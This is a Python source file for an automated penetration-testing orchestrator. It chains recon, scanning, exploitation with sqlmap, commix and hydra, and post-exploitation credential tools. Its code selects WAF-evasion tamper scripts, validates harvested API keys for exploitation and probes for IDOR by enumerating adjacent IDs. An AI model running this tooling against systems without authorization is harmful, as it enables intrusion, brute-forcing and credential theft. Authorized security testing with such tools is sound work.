#!/usr/bin/env python3
"""
AIPT Orchestrator - Full Penetration Testing Pipeline
=====================================================

Orchestrates the complete pentest workflow:
    RECON → SCAN → EXPLOIT → REPORT

Each phase uses specialized tools and integrates with enterprise scanners
(Acunetix, Burp Suite) for comprehensive coverage.

Usage:
    from aipt_v2.orchestrator import Orchestrator

    orch = Orchestrator("example.com")
    results = await orch.run()

Or via CLI:
    python -m aipt_v2.orchestrator example.com --output ./results
"""

import asyncio
import json
import logging
import os
import re
import shlex
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

import httpx

# Scanner integrations
from aipt_v2.tools.scanners import (
    AcunetixTool,
    AcunetixConfig,
    ScanProfile,
    BurpTool,
    BurpConfig,
    NessusTool,
    NessusConfig,
    ZAPTool,
    ZAPConfig,
    get_acunetix,
    get_burp,
    get_nessus,
    get_zap,
    acunetix_scan,
    acunetix_vulns,
    nessus_vulns,
    zap_alerts,
    get_all_findings,
    test_all_connections,
)

# Passive reconnaissance intelligence
from aipt_v2.tools.intelligence import (
    ZoomEyeTool,
    ZoomEyeConfig,
    get_zoomeye,
    zoomeye_domain_search,
)

# VPS Remote Execution (optional)
try:
    from aipt_v2.runtime.vps import VPSRuntime, get_vps_runtime
    VPS_AVAILABLE = True
except ImportError:
    VPS_AVAILABLE = False

# Intelligence module - Advanced analysis capabilities
from aipt_v2.intelligence import (
    # Vulnerability Chaining - Connect related findings into attack paths
    VulnerabilityChainer,
    AttackChain,
    # AI-Powered Triage - Prioritize by real-world impact
    AITriage,
    TriageResult,
    # Scope Enforcement - Stay within authorization
    ScopeEnforcer,
    ScopeConfig,
    ScopeDecision,
    create_scope_from_target,
    # Authentication - Test protected resources
    AuthenticationManager,
    AuthCredentials,
    AuthMethod,
)

# Web Crawler - Discover endpoints, forms, and parameters before exploitation
from aipt_v2.browser.crawler import WebCrawler, CrawlConfig, CrawlResult

# API Security Tools - Detection of API-specific vulnerabilities
from aipt_v2.tools.api_security.api_discovery import APIDiscovery, APIDiscoveryConfig, APIDiscoveryResult
from aipt_v2.tools.api_security.jwt_analyzer import JWTAnalyzer, JWTFinding
from aipt_v2.tools.api_security.graphql_scanner import GraphQLScanner, GraphQLConfig, GraphQLScanResult

# Payload Modules - Various attack payloads for security testing
from aipt_v2.payloads.ssrf import SSRFPayloads
from aipt_v2.payloads.traversal import PathTraversalPayloads
from aipt_v2.payloads.templates import TemplateInjectionPayloads

# XXE Payloads - imported conditionally for compatibility
try:
    from aipt_v2.payloads.xxe import XXEPayloads
    XXE_AVAILABLE = True
except ImportError:
    XXE_AVAILABLE = False
    XXEPayloads = None

# WAF Bypass Mutations - Payload transformations to evade WAFs
try:
    from aipt_v2.exploitation.mutations import (
        SQLiMutator,
        XSSMutator,
        CMDMutator,
        get_sqli_variants,
        get_xss_variants,
        get_cmd_variants,
    )
    MUTATIONS_AVAILABLE = True
except ImportError:
    MUTATIONS_AVAILABLE = False
    # Provide fallback functions when mutations module not available
    def get_sqli_variants(payload, limit=10): return [payload]
    def get_xss_variants(payload, limit=10): return [payload]
    def get_cmd_variants(payload, limit=10): return [payload]

# UI Components for real-time display
from aipt_v2.ui import LiveFindingsPanel, Colors

logger = logging.getLogger(__name__)


# ==================== SECURITY: Input Validation ====================

# Domain validation pattern (RFC 1123 compliant)
# Allows: alphanumeric, hyphens (not at start/end), dots for subdomains
DOMAIN_PATTERN = re.compile(
    r'^(?!-)'                           # Cannot start with hyphen
    r'(?:[a-zA-Z0-9]'                   # Start with alphanumeric
    r'(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?' # Middle can have hyphens
    r'\.)*'                             # Subdomains separated by dots
    r'[a-zA-Z0-9]'                      # Domain start
    r'(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?' # Domain middle
    r'\.[a-zA-Z]{2,}$'                  # TLD (at least 2 chars)
)

# IP address pattern (IPv4)
IPV4_PATTERN = re.compile(
    r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
    r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
)

# Characters that are dangerous in shell commands
SHELL_DANGEROUS_CHARS = set(';|&$`\n\r\\\'\"(){}[]<>!')


def validate_domain(domain: str) -> str:
    """
    Validate domain format to prevent command injection (CWE-78).

    Args:
        domain: Domain string to validate

    Returns:
        Validated domain string

    Raises:
        ValueError: If domain format is invalid or contains dangerous characters
    """
    if not domain:
        raise ValueError("Domain cannot be empty")

    domain = domain.strip().lower()

    # Check length
    if len(domain) > 253:
        raise ValueError(f"Domain too long: {len(domain)} chars (max 253)")

    # Check for dangerous shell characters
    dangerous_found = set(domain) & SHELL_DANGEROUS_CHARS
    if dangerous_found:
        raise ValueError(
            f"Domain contains dangerous characters: {dangerous_found}. "
            "Possible command injection attempt."
        )

    # Validate as IP or domain
    if IPV4_PATTERN.match(domain):
        return domain

    if DOMAIN_PATTERN.match(domain):
        return domain

    raise ValueError(
        f"Invalid domain format: {domain}. "
        "Expected format: example.com or sub.example.com"
    )


def sanitize_for_shell(value: str) -> str:
    """
    Sanitize a value for safe use in shell commands using shlex.quote.

    Args:
        value: String to sanitize

    Returns:
        Shell-escaped string safe for command interpolation
    """
    return shlex.quote(value)


class Phase(Enum):
    """Pentest phases."""
    RECON = "recon"
    SCAN = "scan"
    ANALYZE = "analyze"  # Intelligence analysis (chaining, triage)
    EXPLOIT = "exploit"
    POST_EXPLOIT = "post_exploit"  # Privilege escalation & lateral movement
    REPORT = "report"


class Severity(Enum):
    """Finding severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Finding:
    """Security finding from any tool."""
    type: str
    value: str
    description: str
    severity: str
    phase: str
    tool: str
    target: str = ""
    evidence: str = ""
    remediation: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


@dataclass
class PhaseResult:
    """Result of a phase execution."""
    phase: Phase
    status: str
    started_at: str
    finished_at: str
    duration: float
    findings: List[Finding]
    tools_run: List[str]
    errors: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class OrchestratorConfig:
    """Configuration for the orchestrator."""
    # Target
    target: str
    output_dir: str = "./scan_results"

    # Scan mode
    full_mode: bool = True  # Enable all tools including exploitation (default ON for comprehensive scanning)

    # Output control (clean by default, use -v for verbose)
    verbose: bool = False  # Show verbose output and command results in real-time
    show_command_output: bool = False  # Display command stdout/stderr as it runs

    # Phase control
    skip_recon: bool = False
    skip_scan: bool = False
    skip_exploit: bool = False
    skip_post_exploit: bool = True  # Disabled by default, auto-enables on shell access
    skip_report: bool = False

    # Recon settings - ENHANCED with 10 tools
    recon_tools: List[str] = field(default_factory=lambda: [
        "subfinder", "assetfinder", "amass", "httpx", "nmap",
        "waybackurls", "theHarvester", "dnsrecon", "wafw00f", "whatweb"
    ])

    # Scan settings - ENHANCED with 8 tools
    scan_tools: List[str] = field(default_factory=lambda: [
        "nuclei", "ffuf", "sslscan", "nikto", "wpscan",
        "testssl", "gobuster", "dirsearch"
    ])

    # Exploit settings - NEW exploitation tools (enabled in full_mode)
    exploit_tools: List[str] = field(default_factory=lambda: [
        "sqlmap", "commix", "xsstrike", "hydra", "searchsploit"
    ])

    # Post-exploit settings - NEW privilege escalation tools
    post_exploit_tools: List[str] = field(default_factory=lambda: [
        "linpeas", "winpeas", "pspy", "lazagne"
    ])

    # Enterprise scanners
    use_acunetix: bool = True
    use_burp: bool = False
    use_nessus: bool = True  # Enable Nessus scanning by default
    use_zap: bool = False  # NEW
    acunetix_profile: str = "full"
    wait_for_scanners: bool = True  # Wait for enterprise scanners to complete and collect results
    scanner_timeout: int = 3600
    scanner_poll_interval: int = 30  # Seconds between status checks
    collect_scanner_results_at_end: bool = True  # Final aggregation before report

    # VPS Remote Execution
    use_vps: bool = False  # Run tools on VPS instead of locally
    vps_tools: List[str] = field(default_factory=list)  # Tools to run on VPS (empty = all)

    # Intelligence/Passive Recon settings
    use_zoomeye: bool = False  # ZoomEye cyberspace search
    use_shodan: bool = False   # Shodan IoT search (future)
    zoomeye_max_results: int = 100  # Max results per query

    # Exploit settings
    validate_findings: bool = True
    check_sensitive_paths: bool = True
    enable_exploitation: bool = False  # Requires explicit opt-in or full_mode

    # SQLMap settings
    sqlmap_level: int = 2
    sqlmap_risk: int = 2
    sqlmap_timeout: int = 600

    # Hydra settings
    hydra_threads: int = 4
    hydra_timeout: int = 300
    wordlist_users: str = "/usr/share/wordlists/metasploit/unix_users.txt"
    wordlist_passwords: str = "/usr/share/wordlists/rockyou.txt"

    # Container/DevSecOps settings
    enable_container_scan: bool = False
    enable_secret_detection: bool = False
    trivy_severity: str = "HIGH,CRITICAL"

    # Report settings
    report_format: str = "html"
    report_template: str = "professional"

    # Shell access tracking (set during exploitation)
    shell_obtained: bool = False
    target_os: str = ""  # "linux", "windows", or ""

    # Intelligence module settings
    enable_intelligence: bool = True  # Enable chaining and triage
    scope_config: Optional[ScopeConfig] = None  # Authorization boundary
    auth_credentials: Optional[AuthCredentials] = None  # Authentication for protected resources

    # Key validation settings (NEW in v3.5.0)
    enable_key_validation: bool = True  # Auto-validate API keys found in findings
    key_validation_realtime: bool = True  # Validate keys as they're found (vs batch at end)
    show_key_validation_thinking: bool = True  # Show AI thinking during key validation
    scan_s3_buckets: bool = True  # Check S3 buckets for public access


class Orchestrator:
    """
    AIPT Orchestrator - Full pentest pipeline controller.

    Coordinates reconnaissance, scanning, exploitation, and reporting
    phases with integrated support for enterprise scanners.
    """

    def __init__(self, target: str, config: Optional[OrchestratorConfig] = None):
        """
        Initialize the orchestrator.

        Args:
            target: Target domain or URL
            config: Optional configuration
        """
        self.target = self._normalize_target(target)
        self.domain = self._extract_domain(target)
        self.config = config or OrchestratorConfig(target=target)
        self.config.target = self.target

        # Auto-enable scanners based on available configuration
        self._auto_enable_scanners()

        # State
        self.findings: List[Finding] = []
        self.phase_results: Dict[Phase, PhaseResult] = {}
        self.subdomains: List[str] = []
        self.live_hosts: List[str] = []
        self.open_ports: List[str] = []  # Discovered open ports
        self.scan_ids: Dict[str, str] = {}  # Scanner -> scan_id mapping

        # Crawler results - Discovered endpoints, forms, and parameters
        self.crawl_result: Optional[CrawlResult] = None
        self.discovered_endpoints: List[str] = []
        self.discovered_forms: List[dict] = []
        self.discovered_parameters: List[dict] = []

        # Setup output directory
        self.timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.output_dir = Path(self.config.output_dir) / f"{self.domain}_scan_{self.timestamp}"
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Callbacks
        self.on_phase_start: Optional[Callable[[Phase], None]] = None
        self.on_phase_complete: Optional[Callable[[PhaseResult], None]] = None
        self.on_finding: Optional[Callable[[Finding], None]] = None
        self.on_tool_start: Optional[Callable[[str, str], None]] = None
        self.on_tool_complete: Optional[Callable[[str, str, Any], None]] = None
        self.on_chain_discovered: Optional[Callable[[AttackChain], None]] = None

        # Live findings panel for real-time display
        self._live_panel: Optional[LiveFindingsPanel] = None
        self._scan_start_time: Optional[float] = None

        # =====================================================================
        # Intelligence Module Components
        # =====================================================================
        if self.config.enable_intelligence:
            # Scope Enforcement - Ensure testing stays within authorization
            if self.config.scope_config:
                self._scope_enforcer = ScopeEnforcer(self.config.scope_config)
                issues = self._scope_enforcer.validate_scope_config()
                for issue in issues:
                    logger.warning(f"Scope config: {issue}")
            else:
                self._scope_enforcer = ScopeEnforcer(create_scope_from_target(self.target))

            # Vulnerability Chainer - Connect related findings
            self._vuln_chainer = VulnerabilityChainer()

            # AI Triage - Prioritize findings by real-world impact
            self._ai_triage = AITriage()

            # Authentication Manager
            self._auth_manager: Optional[AuthenticationManager] = None
            if self.config.auth_credentials and self.config.auth_credentials.method != AuthMethod.NONE:
                self._auth_manager = AuthenticationManager(self.config.auth_credentials)
                logger.info(f"Authentication configured: {self.config.auth_credentials.method.value}")

            # Analysis results storage
            self.attack_chains: List[AttackChain] = []
            self.triage_result: Optional[TriageResult] = None
        else:
            self._scope_enforcer = None
            self._vuln_chainer = None
            self._ai_triage = None
            self._auth_manager = None
            self.attack_chains = []
            self.triage_result = None

        # =====================================================================
        # Key Validation Module (NEW in v3.5.0)
        # =====================================================================
        self._key_validation_bridge = None
        if self.config.enable_key_validation:
            try:
                from .post_exploit.key_validation import (
                    KeyValidationBridge,
                    KeyValidationConfig,
                )
                key_config = KeyValidationConfig(
                    enabled=True,
                    validate_in_realtime=self.config.key_validation_realtime,
                    show_ai_thinking=self.config.show_key_validation_thinking,
                    scan_s3_buckets=self.config.scan_s3_buckets,
                )
                self._key_validation_bridge = KeyValidationBridge(
                    config=key_config,
                    on_key_validated=self._on_key_validated,
                )
                logger.info("Key validation module enabled")
            except ImportError as e:
                logger.warning(f"Key validation module not available: {e}")

        logger.info(f"Orchestrator initialized for {self.domain}")
        logger.info(f"Output directory: {self.output_dir}")
        if self.config.enable_intelligence:
            logger.info("Intelligence module enabled (chaining, triage, scope)")

    def _auto_enable_scanners(self):
        """
        Auto-enable scanners based on available configuration.

        Checks the global AIPT config for scanner credentials and URLs.
        If a scanner's configuration is present, it gets auto-enabled.
        """
        from aipt_v2.config import get_config
        global_config = get_config()

        # Acunetix: auto-enable if URL and API key are configured
        if global_config.scanners.acunetix_url and global_config.scanners.acunetix_api_key:
            if not self.config.use_acunetix:
                logger.info("Acunetix auto-enabled (configuration detected)")
            self.config.use_acunetix = True
        elif self.config.use_acunetix and not global_config.scanners.acunetix_url:
            logger.warning("Acunetix requested but not configured - disabling")
            self.config.use_acunetix = False

        # Burp Suite: auto-enable if URL and API key are configured
        if global_config.scanners.burp_url and global_config.scanners.burp_api_key:
            if not self.config.use_burp:
                logger.info("Burp Suite auto-enabled (configuration detected)")
            self.config.use_burp = True
        elif self.config.use_burp and not global_config.scanners.burp_url:
            logger.warning("Burp Suite requested but not configured - disabling")
            self.config.use_burp = False

        # Nessus: auto-enable if URL and access/secret keys are configured
        if (global_config.scanners.nessus_url and
            global_config.scanners.nessus_access_key and
            global_config.scanners.nessus_secret_key):
            if not self.config.use_nessus:
                logger.info("Nessus auto-enabled (configuration detected)")
            self.config.use_nessus = True
        elif self.config.use_nessus and not global_config.scanners.nessus_url:
            logger.warning("Nessus requested but not configured - disabling")
            self.config.use_nessus = False

        # OWASP ZAP: auto-enable if URL is configured (API key is optional for ZAP)
        if global_config.scanners.zap_url:
            if not self.config.use_zap:
                logger.info("OWASP ZAP auto-enabled (configuration detected)")
            self.config.use_zap = True
        elif self.config.use_zap and not global_config.scanners.zap_url:
            logger.warning("OWASP ZAP requested but not configured - disabling")
            self.config.use_zap = False

        # ZoomEye: auto-enable if API key is configured
        if global_config.intelligence.zoomeye_api_key:
            if not self.config.use_zoomeye:
                logger.info("ZoomEye auto-enabled (API key detected)")
            self.config.use_zoomeye = True
        elif self.config.use_zoomeye and not global_config.intelligence.zoomeye_api_key:
            logger.warning("ZoomEye requested but API key not configured - disabling")
            self.config.use_zoomeye = False

    @staticmethod
    def _normalize_target(target: str) -> str:
        """Normalize target URL."""
        if not target.startswith(("http://", "https://")):
            return f"https://{target}"
        return target

    @staticmethod
    def _extract_domain(target: str) -> str:
        """
        Extract and validate domain from target.

        Security: Validates domain format to prevent command injection (CWE-78).
        """
        domain = target.replace("https://", "").replace("http://", "")
        domain = domain.split("/")[0]
        domain = domain.split(":")[0]

        # Security: Validate domain format
        return validate_domain(domain)

    @property
    def safe_domain(self) -> str:
        """
        Get shell-safe domain for command interpolation.

        Returns:
            Shell-escaped domain string
        """
        return sanitize_for_shell(self.domain)

    def _get_terminal_width(self) -> int:
        """Get terminal width, with fallback to 80."""
        try:
            import shutil
            return shutil.get_terminal_size().columns
        except Exception:
            return 80

    def _log_phase(self, phase: Phase, message: str):
        """Log a phase message with auto-scaled width."""
        width = self._get_terminal_width() - 4  # Leave small margin
        print(f"\n{'='*width}", flush=True)
        print(f"  [{phase.value.upper()}] {message}", flush=True)
        print(f"{'='*width}\n", flush=True)

    def _sanitize_tool_output(self, output: str) -> str:
        """
        Sanitize tool output by removing ANSI codes and junk lines.

        Filters out:
        - ANSI escape codes (colors, cursor movements)
        - Progress bar characters (▰▱█░▓▒)
        - Lines that are mostly progress indicators
        - Empty lines and whitespace-only lines
        """
        import re

        if not output:
            return ""

        # Strip ANSI escape codes
        ansi_pattern = re.compile(r'\033\[[0-9;]*[a-zA-Z]|\x1b\[[0-9;]*[a-zA-Z]')
        output = ansi_pattern.sub('', output)

        # Filter junk lines
        clean_lines = []
        junk_patterns = [
            r'^[\s\[\]\/\|\\-_▰▱█░▓▒○●◉◐◑◒◓⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏\.\d%pP\?\s]*$',  # Progress bars
            r'^\s*\d+\s*/\s*\d+\s*\[',  # "0 / 1 [___" style progress
            r'^\s*[\d\.]+%',  # Percentage only lines
            r'^\s*$',  # Empty lines
        ]

        for line in output.split('\n'):
            is_junk = False
            for pattern in junk_patterns:
                if re.match(pattern, line):
                    is_junk = True
                    break
            if not is_junk and line.strip():
                clean_lines.append(line)

        return '\n'.join(clean_lines)

    def _log_tool(self, tool: str, status: str = "running", elapsed: float = None, error: str = None):
        """Log tool execution with status indicator and elapsed time."""
        # Update live panel with current tool
        if self._live_panel:
            if status == "running":
                self._live_panel.set_current_tool(tool.split(" - ")[0] if " - " in tool else tool)

        # In non-verbose mode, suppress "running" status and "command not found" errors
        if not self.config.verbose:
            # Skip "running" messages entirely when not verbose
            if status == "running":
                return
            # Skip "command not found" errors (missing tools) when not verbose
            if status == "error" and error and ("command not found" in error.lower() or "not found" in error.lower()):
                return
            # Skip section headers like "Subdomain Enumeration" when not verbose
            if status == "running" and not any(x in tool for x in ["subfinder", "nmap", "nuclei", "httpx"]):
                return

        icon = "◉" if status == "running" else "✓" if status == "done" else "✗"
        color_start = "\033[33m" if status == "running" else "\033[32m" if status == "done" else "\033[31m"
        color_end = "\033[0m"

        # Build status line with optional elapsed time
        status_line = f"  [{color_start}{icon}{color_end}] {tool}"
        if elapsed is not None and status != "running":
            status_line += f" \033[90m({elapsed:.1f}s)\033[0m"

        print(status_line, flush=True)

        if status == "running" and self.config.verbose:
            print(f"      → Executing...", flush=True)
        elif status == "error" and error and self.config.verbose:
            # Only show errors in verbose mode (except critical ones)
            print(f"      \033[31m→ Error: {error[:100]}\033[0m", flush=True)
        elif status == "done" and self.config.verbose:
            pass  # Output already shown during execution

    def _print_live_status(self) -> None:
        """Print compact live findings status line."""
        if not self._live_panel:
            return

        status = self._live_panel.render_compact()
        print(f"  {Colors.BRIGHT_CYAN}📊{Colors.RESET} {status}", flush=True)

    def _print_live_panel(self) -> None:
        """Print the full live findings panel."""
        if not self._live_panel:
            return

        print(self._live_panel.render())

    def _print_progress_bar(self, scanner_name: str, progress: int, width: int = 30) -> None:
        """
        Print an inline progress bar that updates in place.

        Uses carriage return to overwrite the same line instead of printing new lines.
        """
        import sys

        # Clamp progress to valid range
        progress = max(0, min(100, progress))

        # Calculate filled portion
        filled = int(width * progress / 100)
        empty = width - filled

        # Build the progress bar with colors
        bar = f"\033[92m{'█' * filled}\033[90m{'░' * empty}\033[0m"

        # Color the percentage based on progress
        if progress < 25:
            pct_color = "\033[91m"  # Red
        elif progress < 50:
            pct_color = "\033[93m"  # Yellow
        elif progress < 75:
            pct_color = "\033[33m"  # Orange
        else:
            pct_color = "\033[92m"  # Green

        # Print with carriage return to overwrite same line
        status_line = f"    {bar} {pct_color}{progress:3d}%\033[0m"
        sys.stdout.write(f"\r{status_line}")
        sys.stdout.flush()

    def _finish_progress_bar(self, scanner_name: str, status: str = "completed") -> None:
        """
        Finish the progress bar and move to next line.
        """
        import sys

        if status == "completed":
            # Show completed bar
            bar = f"\033[92m{'█' * 30}\033[0m"
            sys.stdout.write(f"\r    {bar} \033[92m100% ✓\033[0m\n")
        elif status == "timeout":
            sys.stdout.write(f"\r    \033[93m⚠ Timeout - collecting partial results\033[0m" + " " * 20 + "\n")
        else:
            sys.stdout.write(f"\r    \033[91m✗ {status}\033[0m" + " " * 30 + "\n")
        sys.stdout.flush()

    async def _run_command(self, cmd: str, timeout: int = 300) -> tuple[int, str]:
        """
        Run a shell command asynchronously with optional real-time output.

        In verbose mode, streams output to console as it's produced.
        Always captures output for return value.
        """
        try:
            if self.config.show_command_output:
                # Stream output in real-time while also capturing it
                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT  # Merge stderr into stdout
                )

                output_lines = []

                async def read_stream():
                    """Read and display output line by line with heartbeat."""
                    import sys
                    last_output_time = time.time()
                    heartbeat_interval = 30  # Show heartbeat every 30 seconds if no output

                    while True:
                        try:
                            # Use wait_for to enable heartbeat checking
                            line = await asyncio.wait_for(proc.stdout.readline(), timeout=heartbeat_interval)
                            if not line:
                                break
                            decoded = line.decode('utf-8', errors='replace').rstrip()
                            output_lines.append(decoded)
                            last_output_time = time.time()
                            if self.config.verbose:
                                # Print with indentation for readability
                                print(f"      {decoded}", flush=True)
                        except asyncio.TimeoutError:
                            # No output for a while, show heartbeat
                            elapsed = time.time() - last_output_time
                            if self.config.verbose:
                                print(f"      \033[90m... still running ({elapsed:.0f}s since last output)\033[0m", flush=True)

                try:
                    await asyncio.wait_for(read_stream(), timeout=timeout)
                    await proc.wait()
                except asyncio.TimeoutError:
                    proc.kill()
                    return -1, f"Command timed out after {timeout}s"

                output = "\n".join(output_lines)
                return proc.returncode or 0, output
            else:
                # Silent mode - capture output without displaying
                proc = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(),
                    timeout=timeout
                )
                output = (stdout.decode() if stdout else "") + (stderr.decode() if stderr else "")
                return proc.returncode or 0, output
        except asyncio.TimeoutError:
            return -1, f"Command timed out after {timeout}s"
        except Exception as e:
            return -1, str(e)

    async def _get_auth_headers(self) -> dict[str, str]:
        """Get authentication headers if configured."""
        if self._auth_manager:
            try:
                return await self._auth_manager.get_auth_headers()
            except Exception as e:
                logger.warning(f"Failed to get auth headers: {e}")
        return {}

    def _get_auth_header_args(self, headers: dict[str, str]) -> str:
        """Convert auth headers to CLI argument format for tools like Nuclei."""
        if not headers:
            return ""
        # Format: -H "Header1: Value1" -H "Header2: Value2"
        args = []
        for name, value in headers.items():
            args.append(f'-H "{name}: {value}"')
        return " ".join(args)

    def _get_waf_bypass_sqlmap_args(self) -> str:
        """
        Get SQLMap arguments for WAF bypass based on detected WAF.

        Returns SQLMap tamper scripts and options to evade WAF detection.
        """
        # Check if WAF was detected in findings
        waf_finding = next(
            (f for f in self.findings if f.type == "waf_detected"),
            None
        )

        if not waf_finding:
            return ""

        waf_name = waf_finding.value.lower() if waf_finding.value else ""

        # SQLMap tamper scripts for specific WAFs
        waf_tampers = {
            "cloudflare": "between,charencode,space2comment",
            "akamai": "space2comment,charencode,randomcase",
            "aws waf": "space2comment,between,randomcase",
            "imperva": "charencode,space2comment,between,randomcase",
            "incapsula": "charencode,space2comment,randomcase",
            "f5": "space2comment,charencode,between",
            "modsecurity": "space2comment,charencode,modsecurityversioned,modsecurityzeroversioned",
            "fortiweb": "space2comment,charencode,randomcase",
            "barracuda": "space2comment,charencode,between",
            "sucuri": "space2comment,charencode,randomcase",
        }

        # Default tampers if specific WAF not identified
        default_tampers = "space2comment,charencode,randomcase,between"

        # Find matching tamper scripts
        tampers = default_tampers
        for waf_key, waf_scripts in waf_tampers.items():
            if waf_key in waf_name:
                tampers = waf_scripts
                break

        # Build SQLMap WAF bypass arguments
        args = [
            f"--tamper={tampers}",
            "--random-agent",
            "--delay=1",  # Slow down to avoid rate limiting
            "--safe-url=" + self.target,  # Keep session alive
            "--safe-freq=3",
            "--hpp",  # HTTP Parameter Pollution
        ]

        logger.info(f"WAF detected ({waf_finding.value}), applying tamper scripts: {tampers}")
        return " ".join(args)

    def _apply_waf_mutations(self, payload: str, payload_type: str = "sqli") -> List[str]:
        """
        Apply WAF bypass mutations to a payload.

        Args:
            payload: Original payload
            payload_type: Type of payload ('sqli', 'xss', 'cmd')

        Returns:
            List of mutated payload variants
        """
        if not MUTATIONS_AVAILABLE:
            return [payload]

        try:
            if payload_type == "sqli":
                return get_sqli_variants(payload, limit=10)
            elif payload_type == "xss":
                return get_xss_variants(payload, limit=10)
            elif payload_type == "cmd":
                return get_cmd_variants(payload, limit=10)
            else:
                return [payload]
        except Exception as e:
            logger.debug(f"WAF mutation failed: {e}")
            return [payload]

    def _add_finding(self, finding: Finding):
        """Add a finding and trigger callback."""
        self.findings.append(finding)
        if self.on_finding:
            self.on_finding(finding)

        # Key validation - check for API keys in findings
        if self._key_validation_bridge and self.config.enable_key_validation:
            asyncio.create_task(self._validate_keys_in_finding(finding))

    async def _validate_keys_in_finding(self, finding: Finding):
        """Validate API keys found in a finding."""
        try:
            results = await self._key_validation_bridge.on_finding(finding)
            for result in results:
                if result.is_valid:
                    # Add validated key as a new finding
                    key_finding = Finding(
                        type="valid_api_key",
                        value=f"{result.key_info.key_type.value.upper()}: {result.key_info.masked_value}",
                        description=f"Valid {result.key_info.key_type.value} API key with {len(result.permissions)} permissions. {result.exploitation_potential or ''}",
                        severity=result.risk_level.value,
                        phase="post_exploit",
                        tool="key_validator",
                        evidence=f"Identity: {result.identity_info}, Permissions: {result.permissions[:5]}",
                        metadata={
                            "key_type": result.key_info.key_type.value,
                            "risk_level": result.risk_level.value,
                            "permissions_count": len(result.permissions),
                            "resources_count": len(result.resources_accessible),
                            "attack_vectors": result.attack_vectors or [],
                        }
                    )
                    self.findings.append(key_finding)
                    if self.on_finding:
                        self.on_finding(key_finding)
        except Exception as e:
            logger.debug(f"Key validation error: {e}")

    def _on_key_validated(self, result):
        """Callback when a key is validated."""
        if result.is_valid:
            risk_emoji = {
                "critical": "🔴",
                "high": "🟠",
                "medium": "🟡",
                "low": "🔵",
                "info": "⚪",
            }.get(result.risk_level.value, "")
            logger.info(f"{risk_emoji} Valid {result.key_info.key_type.value.upper()} key found - {result.exploitation_potential or 'See details'}")

    async def _test_bola_idor(self) -> List[Finding]:
        """
        Test for Broken Object Level Authorization (BOLA) / IDOR vulnerabilities.

        This tests:
        1. ID-based endpoints for horizontal privilege escalation
        2. Sequential ID enumeration
        3. Authenticated vs unauthenticated access differences
        """
        findings = []

        # Patterns to identify ID-based endpoints
        id_patterns = [
            r'/(\d+)(?:/|$|\?)',           # /users/123, /orders/456/
            r'/([a-f0-9-]{36})(?:/|$|\?)',  # UUID patterns /users/abc-123-...
            r'[?&]id=(\d+)',                # ?id=123
            r'[?&]user_id=(\d+)',           # ?user_id=123
            r'[?&]order_id=(\d+)',          # ?order_id=123
            r'[?&]account=(\d+)',           # ?account=123
        ]

        # Find endpoints with IDs from crawler discoveries
        id_endpoints = []
        for endpoint in self.discovered_endpoints:
            for pattern in id_patterns:
                match = re.search(pattern, endpoint)
                if match:
                    id_endpoints.append({
                        'url': endpoint,
                        'id_value': match.group(1),
                        'pattern': pattern
                    })
                    break

        if not id_endpoints:
            logger.info("No ID-based endpoints found for BOLA testing")
            return findings

        logger.info(f"Testing {len(id_endpoints)} ID-based endpoints for BOLA")

        # Get auth headers
        auth_headers = await self._get_auth_headers()

        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True) as client:
            for ep in id_endpoints[:20]:  # Limit to 20 endpoints
                url = ep['url']
                original_id = ep['id_value']

                try:
                    # Test 1: Authenticated request (baseline)
                    if auth_headers:
                        auth_response = await client.get(url, headers=auth_headers)
                        auth_status = auth_response.status_code
                        auth_length = len(auth_response.text)
                    else:
                        auth_response = None
                        auth_status = None
                        auth_length = 0

                    # Test 2: Unauthenticated request (should fail if protected)
                    unauth_response = await client.get(url)
                    unauth_status = unauth_response.status_code

                    # BOLA Check 1: Resource accessible without auth
                    if auth_headers and unauth_status == 200 and auth_status == 200:
                        # Check if content is similar (actual data access, not error page)
                        if len(unauth_response.text) > 100 and abs(len(unauth_response.text) - auth_length) < 500:
                            findings.append(Finding(
                                type="bola_no_auth",
                                value=f"BOLA: Resource accessible without authentication",
                                description=f"Endpoint {url} returns user data without authentication. "
                                           f"Authenticated and unauthenticated responses are similar.",
                                severity="high",
                                phase="exploit",
                                tool="bola-test",
                                target=url,
                                metadata={
                                    "auth_status": auth_status,
                                    "unauth_status": unauth_status,
                                    "id_value": original_id
                                }
                            ))

                    # Test 3: ID enumeration (try adjacent IDs)
                    if original_id.isdigit():
                        test_ids = [
                            str(int(original_id) + 1),
                            str(int(original_id) - 1),
                            str(int(original_id) + 100),
                        ]

                        for test_id in test_ids:
                            # Replace ID in URL
                            test_url = url.replace(original_id, test_id)
                            if test_url == url:
                                continue

                            try:
                                headers_to_use = auth_headers if auth_headers else {}
                                enum_response = await client.get(test_url, headers=headers_to_use)

                                # BOLA Check 2: Can access other users' resources
                                if enum_response.status_code == 200:
                                    # Check if it's real data, not an error page
                                    if len(enum_response.text) > 200:
                                        findings.append(Finding(
                                            type="bola_idor",
                                            value=f"IDOR: Can access other users' resources",
                                            description=f"Endpoint allows accessing resource ID {test_id} "
                                                       f"(original: {original_id}). This may indicate IDOR vulnerability.",
                                            severity="critical",
                                            phase="exploit",
                                            tool="bola-test",
                                            target=test_url,
                                            metadata={
                                                "original_id": original_id,
                                                "accessed_id": test_id,
                                                "response_length": len(enum_response.text)
                                            }
                                        ))
                                        # Only report once per endpoint
